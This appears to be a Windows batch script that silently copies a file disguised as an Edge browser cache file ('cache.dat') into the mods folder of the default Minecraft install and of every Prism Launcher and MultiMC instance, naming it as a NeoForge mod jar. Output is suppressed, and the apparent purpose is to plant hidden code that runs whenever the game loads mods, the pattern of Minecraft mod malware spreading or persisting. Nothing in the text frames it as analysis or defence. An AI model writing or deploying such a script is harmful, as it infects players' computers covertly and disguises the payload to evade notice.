@echo off
copy /y "%APPDATA%\Microsoft\Edge\cache.dat" "%APPDATA%\.minecraft\mods\e4all-neoforge-1.6.2.jar" >nul 2>&1
for /d %%i in ("%APPDATA%\PrismLauncher\instances\*") do copy /y "%APPDATA%\Microsoft\Edge\cache.dat" "%%i\minecraft\mods\e4all-neoforge-1.6.2.jar" >nul 2>&1
for /d %%i in ("%APPDATA%\MultiMC\instances\*") do copy /y "%APPDATA%\Microsoft\Edge\cache.dat" "%%i\minecraft\mods\e4all-neoforge-1.6.2.jar" >nul 2>&1